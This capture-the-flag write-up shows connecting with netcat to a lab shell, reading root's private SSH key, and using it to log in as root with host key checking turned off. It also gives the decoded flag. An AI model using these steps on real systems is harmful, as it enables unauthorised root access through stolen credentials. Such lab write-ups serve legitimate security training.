## Linux 02
> Can you capture the flag?
> 
> Execute the following command to obtain a reverse shell on your local machine.
> 
> nc 192.168.10.7 9999

```bash
$ nc 192.168.10.7 9999

Where am I?
```

The first command executed was `ls`, you can see a directory called `ytdl`, without any suspicious content. After further inverstigation, we found out that the root directory has accessible, private content:

- `authorized_keys` Specifies the SSH keys that can be used for logging into the user account
- `id_rsa` Here is stored the private key of the root user
- `id_rsa.pub` Here is stored the public key of the root user

With the private key a ssh connection could be done as the root account. Since this a reverse shell which does not expose a SSH server, the connection is done through the reverse shell.

With the command `ssh root@localhost -i /root/.ssh/id_rsa 2>&1` a connection is started. This returns the error `Host key verification failed.`.

To bypass this verification the flag `-o StrictHostKeyChecking=no` can be used.

```bash 
$ ssh root@localhost -i /root/.ssh/id_rsa -o StrictHostKeyChecking=no

Y3liZXJjdGZkezFuZDMzZF93aDNyM193NDVfMX0=

```

This message is base64 encoded, after decoding the flag is shown.

```bash 
$ echo "Y3liZXJjdGZkezFuZDMzZF93aDNyM193NDVfMX0=" | base64 -d
cyberctfd{1nd33d_wh3r3_w45_1}
```
